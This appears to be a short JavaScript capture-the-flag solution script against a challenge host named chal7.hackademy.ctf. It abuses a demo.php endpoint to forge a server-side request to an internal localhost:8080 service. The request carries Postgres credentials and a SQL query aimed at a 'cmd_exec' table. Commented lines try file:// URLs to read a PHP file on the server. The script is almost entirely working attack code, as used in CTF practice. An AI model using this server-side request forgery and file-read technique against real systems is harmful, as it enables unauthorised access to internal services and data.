// const fileName = "/var/www/html/database/index.php"
// // const fileName = "https://username:password@URL"
// const url = `file://${fileName}`
const url = "http://localhost:8080"
const postParams = new FormData();
postParams.append("user", "postgress")
postParams.append("password", "Let&me=in")

// console.log(encodeURI(postParams))

async function query() {
  const resp = await fetch("http://chal7.hackademy.ctf/demo.php", {
    "headers": {
      "accept": "*/*",
      "accept-language": "en-GB,en-US;q=0.9,en;q=0.8,pt;q=0.7,es;q=0.6",
      "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
      "x-requested-with": "XMLHttpRequest",
      "Referer": "http://chal7.hackademy.ctf/",
      "Referrer-Policy": "strict-origin-when-cross-origin"
    },
    "body": "url=http%3A%2F%2Flocalhost%3A8080&method=POST&postparams=user%3Dpostgres%26password%3DLet%2526me%3Din%26query%3DSELECT+*+FROM+cmd_exec;",
    "method": "POST"
  });

  console.log(await resp.text())

}

query()